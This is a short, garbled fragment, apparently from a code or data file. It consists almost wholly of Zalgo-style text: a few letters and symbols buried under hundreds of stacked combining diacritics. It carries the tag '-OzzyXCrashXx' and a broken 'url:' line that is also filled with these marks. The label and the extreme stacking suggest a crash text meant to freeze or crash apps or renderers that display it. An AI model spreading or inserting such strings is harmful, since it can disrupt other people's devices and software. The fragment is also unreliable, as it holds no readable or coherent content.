ᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̢̡̡̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͜͠͠͝͝͠͠ͅͅͅͅͅͅͅͅͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ-O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘'
      url: `https://̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̛̛̛̛̛̭͇̯̼̘̲̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͝͝͠